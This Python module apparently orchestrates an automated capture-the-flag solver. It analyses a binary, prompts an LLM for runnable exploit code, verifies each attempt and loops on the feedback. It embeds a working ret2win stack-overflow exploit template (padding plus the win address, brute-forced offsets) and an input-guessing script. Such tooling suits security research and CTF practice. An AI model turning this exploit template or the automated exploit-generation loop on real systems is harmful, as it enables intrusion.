from __future__ import annotations

import traceback
from pathlib import Path
from time import perf_counter
import re

from .analysis import BinaryAnalyzer
from .config import PipelineConfig
from .llm_client import LLMClient, LLMError
from .generation import ExploitGenerator, GenerationParseError
from .schemas import VerificationResult
from .utils import ensure_dir, ensure_executable, sanitize_filename, utc_timestamp, write_json
from .verification import ExploitVerifier


class SolveOrchestrator:
    def __init__(self, config: PipelineConfig, prompt_template_path: Path | None = None) -> None:
        self.config = config
        self.analyzer = BinaryAnalyzer()
        self.verifier = ExploitVerifier(config)
        self.client = LLMClient(config)
        self.generator = ExploitGenerator(self.client, prompt_template_path=prompt_template_path)

    def solve(
        self,
        binary_path: Path,
        success_regex: list[str] | None = None,
        max_iterations: int | None = None,
        strict_output: bool | None = None,
        enable_pruning: bool | None = None,
    ) -> dict:
        binary_path = binary_path.resolve()
        ensure_executable(binary_path)
        iterations = max_iterations or self.config.max_iterations
        strict = self.config.strict_output if strict_output is None else strict_output
        prune = self.config.enable_pruning if enable_pruning is None else enable_pruning

        run_id = f"{sanitize_filename(binary_path.stem)}_{utc_timestamp().replace(':', '-')}"
        run_dir = self.config.artifact_root / run_id
        ensure_dir(run_dir)

        t0 = perf_counter()
        analysis_report = self.analyzer.analyze(binary_path, prune=prune)
        analysis_path = run_dir / "AnalysisReport.json"
        write_json(analysis_path, analysis_report.to_dict())

        feedback: dict = {
            "message": "first attempt; no previous verification feedback",
            "attempt": 0,
        }
        attempt_logs = []
        solved = False
        success_attempt = None
        last_error = ""

        heuristic_code = _build_heuristic_exploit(analysis_report.to_dict())
        start_attempt = 1
        if heuristic_code:
            attempt_dir = run_dir / "attempt_01"
            ensure_dir(attempt_dir)
            exploit_path = attempt_dir / "exploit.py"
            exploit_path.write_text(heuristic_code + "\n", encoding="utf-8")
            heuristic_strategy = (
                "heuristic_ret2win" if "Heuristic ret2win success" in heuristic_code else "heuristic_branch_input"
            )
            heuristic_payload = {
                "strategy": heuristic_strategy,
                "code": heuristic_code,
                "success_conditions": "Send extracted candidate input and observe WIN/FLAG markers.",
                "raw_text": "heuristic_pre_llm_attempt",
                "used_format_repair": False,
            }
            write_json(attempt_dir / "GenerationResult.json", heuristic_payload)
            ver = self.verifier.verify(
                binary_path=binary_path,
                exploit_path=exploit_path,
                attempt=1,
                success_regex=success_regex,
            )
            ver.artifacts = {
                "exploit_path": str(exploit_path.resolve()),
                "attempt_dir": str(attempt_dir.resolve()),
            }
            write_json(attempt_dir / "VerificationResult.json", ver.to_dict())
            attempt_logs.append(
                {
                    "attempt": 1,
                    "generation_used_format_repair": False,
                    "verification_status": ver.status,
                    "failure_reason": ver.failure_reason,
                    "success_reason": ver.success_reason,
                    "strategy": heuristic_strategy,
                }
            )
            if ver.status == "success":
                solved = True
                success_attempt = 1
            else:
                feedback = ver.feedback_payload
                last_error = ver.failure_reason
                start_attempt = 2

        for attempt in range(start_attempt, iterations + 1):
            if solved:
                break
            attempt_dir = run_dir / f"attempt_{attempt:02d}"
            ensure_dir(attempt_dir)
            generation_payload = {}
            try:
                generation = self.generator.generate(
                    analysis=analysis_report.to_dict(),
                    attempt=attempt,
                    feedback=feedback,
                    strict_output=strict,
                )
                generation_payload = generation.to_dict()
                write_json(attempt_dir / "GenerationResult.json", generation_payload)
                (attempt_dir / "raw_model_output.txt").write_text(
                    generation.raw_text, encoding="utf-8"
                )
                exploit_path = attempt_dir / "exploit.py"
                exploit_path.write_text(generation.code + "\n", encoding="utf-8")
                code_quality_issue = _detect_code_quality_issue(generation.code)
                if code_quality_issue:
                    issue = {
                        "attempt": attempt,
                        "status": "generation_rejected",
                        "error": code_quality_issue,
                    }
                    write_json(attempt_dir / "GenerationFailure.json", issue)
                    attempt_logs.append(issue)
                    feedback = {
                        "attempt": attempt,
                        "status": "generation_rejected",
                        "error": code_quality_issue,
                        "instruction": "produce concrete runnable code without placeholders",
                    }
                    last_error = code_quality_issue
                    continue
            except (LLMError, GenerationParseError) as exc:
                err = {
                    "attempt": attempt,
                    "status": "generation_failed",
                    "error": str(exc),
                    "traceback": traceback.format_exc(limit=3),
                }
                write_json(attempt_dir / "GenerationFailure.json", err)
                attempt_logs.append(err)
                feedback = {
                    "attempt": attempt,
                    "status": "generation_failed",
                    "error": str(exc),
                    "instruction": "repair output format and provide runnable exploit code",
                }
                last_error = str(exc)
                continue
            except Exception as exc:  # noqa: BLE001
                err = {
                    "attempt": attempt,
                    "status": "unexpected_generation_error",
                    "error": str(exc),
                    "traceback": traceback.format_exc(limit=6),
                }
                write_json(attempt_dir / "GenerationFailure.json", err)
                attempt_logs.append(err)
                last_error = str(exc)
                continue

            ver: VerificationResult = self.verifier.verify(
                binary_path=binary_path,
                exploit_path=exploit_path,
                attempt=attempt,
                success_regex=success_regex,
            )
            ver.artifacts = {
                "exploit_path": str(exploit_path.resolve()),
                "attempt_dir": str(attempt_dir.resolve()),
            }
            write_json(attempt_dir / "VerificationResult.json", ver.to_dict())

            log_item = {
                "attempt": attempt,
                "generation_used_format_repair": generation_payload.get("used_format_repair", False),
                "verification_status": ver.status,
                "failure_reason": ver.failure_reason,
                "success_reason": ver.success_reason,
            }
            attempt_logs.append(log_item)

            if ver.status == "success":
                solved = True
                success_attempt = attempt
                break

            feedback = ver.feedback_payload
            last_error = ver.failure_reason

        elapsed = perf_counter() - t0
        summary = {
            "binary_path": str(binary_path),
            "run_dir": str(run_dir.resolve()),
            "solved": solved,
            "success_attempt": success_attempt,
            "attempts_used": len(attempt_logs),
            "max_iterations": iterations,
            "elapsed_seconds": round(elapsed, 3),
            "strict_output": strict,
            "enable_pruning": prune,
            "last_error": last_error,
            "attempt_logs": attempt_logs,
        }
        write_json(run_dir / "run_summary.json", summary)
        return summary


def _detect_code_quality_issue(code: str) -> str | None:
    placeholders = [
        "CORRECT_CODE_HERE",
        "CORRECT_CODE",
        "REQUIRED_CODE",
        "TODO",
        "FILL_ME",
        "REPLACE_ME",
        "<PLACEHOLDER>",
    ]
    for token in placeholders:
        if token in code:
            return f"Generated exploit contains unresolved placeholder: {token}"
    hardcoded_path_hints = [
        "./branch_puzzle",
        "./chall",
        "./challenge",
        "./binary",
    ]
    for token in hardcoded_path_hints:
        if token in code:
            return f"Generated exploit hardcodes target path instead of using argv: {token}"
    return None


def _build_heuristic_exploit(analysis: dict) -> str | None:
    rop_heuristic = _build_ret2win_heuristic(analysis)
    if rop_heuristic:
        return rop_heuristic

    branch_heuristic = _build_branch_input_heuristic(analysis)
    if branch_heuristic:
        return branch_heuristic

    return None


def _build_branch_input_heuristic(analysis: dict) -> str | None:
    strings = analysis.get("interesting_strings", [])
    text_blob = "\n".join(strings)
    if "stack buffer" in text_blob or "pwnme" in text_blob or "ret2win" in text_blob:
        return None

    markers = {"WIN", "Nope", "Say the course code:"}
    candidates = []
    for s in strings:
        if s in markers:
            continue
        if not re.fullmatch(r"[A-Za-z0-9_{}-]{4,64}", s):
            continue
        if s.startswith("GLIBC_") or s.startswith("__") or "/" in s:
            continue
        candidates.append(s)

    if not candidates:
        return None

    preferred = None
    for s in candidates:
        if any(ch.isdigit() for ch in s) and any(ch.isalpha() for ch in s):
            preferred = s
            break
    if preferred is None:
        preferred = candidates[0]

    payload = preferred.encode("utf-8")
    payload_repr = repr(payload + b"\n")

    return f"""import argparse
import subprocess


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=False,
    )
    stdout, stderr = proc.communicate(input={payload_repr}, timeout=5)
    if stdout:
        print(stdout.decode(errors="replace"))
    if stderr:
        print(stderr.decode(errors="replace"))


if __name__ == "__main__":
    main()
"""


def _build_ret2win_heuristic(analysis: dict) -> str | None:
    exports = set(analysis.get("exports", []))
    pruned_context = analysis.get("pruned_context", [])
    context_blob = "\n".join(item.get("snippet", "") for item in pruned_context)
    strings_blob = "\n".join(analysis.get("interesting_strings", []))

    target_symbol = None
    for candidate in ("ret2win", "win"):
        if candidate in exports or f"<{candidate}>:" in context_blob:
            target_symbol = candidate
            break

    if target_symbol is None:
        return None

    if "stack buffer" not in strings_blob and "read()" not in strings_blob and "gets" not in context_blob:
        return None

    return f"""import argparse
import re
from pwn import ELF, context, p64, process


def run_once(binary_path, offset, symbol_name):
    elf = ELF(binary_path, checksec=False)
    context.binary = elf
    target = process(binary_path)
    win_addr = elf.symbols[symbol_name]
    payload = b"A" * offset + p64(win_addr)
    target.sendline(payload)
    data = target.recvall(timeout=2)
    output = data.decode(errors="replace")
    print(f"[offset={{offset}}]")
    print(output)
    return output


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    for offset in (24, 32, 40, 44, 48, 56, 64, 72):
        try:
            output = run_once(binary, offset, "{target_symbol}")
        except EOFError:
            continue
        except Exception as exc:
            print(f"[error] {{exc}}")
            continue

        if re.search(r"ROPE\\{{[^}}]+\\}}|FLAG\\{{[^}}]+\\}}|WIN\\b", output):
            print("[+] Heuristic ret2win success")
            return

    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""
